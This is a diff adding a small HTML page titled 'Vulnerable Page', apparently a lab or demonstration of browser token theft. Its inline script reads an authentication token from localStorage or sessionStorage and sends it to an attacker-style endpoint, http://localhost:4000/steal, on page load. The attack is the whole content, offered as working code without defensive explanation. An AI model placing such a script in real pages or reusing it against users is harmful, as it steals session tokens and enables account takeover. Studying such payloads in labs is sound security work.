@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Vulnerable Page</title>
+  </head>
+  <body>
+    <h1>Welcome, user!</h1>
+    <script>
+      const token = localStorage.getItem('token') || sessionStorage.getItem('token');
+    
+      if (token) {
+        fetch("http://localhost:4000/steal?token=" + token);
+      }
+    </script>
+
+  </body>
+</html>
